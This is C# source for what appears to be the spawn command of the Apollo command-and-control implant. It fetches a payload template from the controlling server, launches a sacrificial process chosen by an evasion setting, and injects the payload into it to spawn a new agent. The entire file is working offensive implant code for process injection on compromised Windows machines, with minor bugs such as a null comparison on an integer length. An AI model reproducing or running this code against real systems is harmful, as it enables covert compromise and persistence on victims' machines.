#define COMMAND_NAME_UPPER

#if DEBUG
#undef SPAWN
#define SPAWN
#endif

#if SPAWN
using Apollo.Jobs;
using System;
using Apollo.Tasks;
using System.Security.Principal;
using Newtonsoft.Json;
using Apollo.Evasion;
using Apollo.SacrificialProcesses;

namespace Apollo.CommandModules
{
    public class Spawn
    {
        public struct SpawnParameters
        {
            public string template;
        }

        public static void Execute(Job job, Agent agent)
        {
            Task task = job.Task;

            SpawnParameters args;
            byte[] templateFile;
            string sacrificialApplication;
            SacrificialProcess sacrificialProcess = null;

            try
            {
                args = JsonConvert.DeserializeObject<SpawnParameters>(task.parameters);
            } catch (Exception ex)
            {
                job.SetError(string.Format("Failed to deserialize arguments from {0}. Error: {1}", task.parameters, ex.Message));
                return;
            }
            if (string.IsNullOrEmpty(args.template))
            {
                job.SetError("No template passed given to inject.");
                return;
            }

            templateFile = agent.Profile.GetFile(job.Task.id, args.template, agent.Profile.ChunkSize);
            if (templateFile.Length == null || templateFile.Length == 0)
            {
                job.SetError($"Unable to retrieve template ID: {args.template}");
                return;
            }

            if (agent.architecture == "x64")
                sacrificialApplication = EvasionManager.SpawnTo64;
            else
                sacrificialApplication = EvasionManager.SpawnTo86;

            try
            {

                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(sacrificialApplication, "", true);

                if (sacrificialProcess.Start())
                {
                    job.ProcessID = (int)sacrificialProcess.PID;
                    job.sacrificialProcess = sacrificialProcess;
                    if (sacrificialProcess.Inject(templateFile))
                    {
                        job.SetComplete(string.Format("Spawned {0} (PID: {1}) and successfully injected the specified payload template.", sacrificialApplication, sacrificialProcess.PID));
                    }
                    else
                    {
                        job.SetError($"Failed to inject payload: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                    }
                }
                else
                {
                    job.SetError($"Failed to start sacrificial process: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception ex)
            {
                if (sacrificialProcess != null)
                {
                    job.SetError(String.Format("Error spawning agent (PID: {0}). Reason: {1}", sacrificialProcess.PID, ex.Message));
                }
                else
                {
                    job.SetError(String.Format("Error spawning agent. Reason: {0}", ex.Message));
                }
            }
            finally
            {
                if (job.Task.status == "error" && !sacrificialProcess.HasExited)
                    sacrificialProcess.Kill();
            }
        }
    }
}
#endif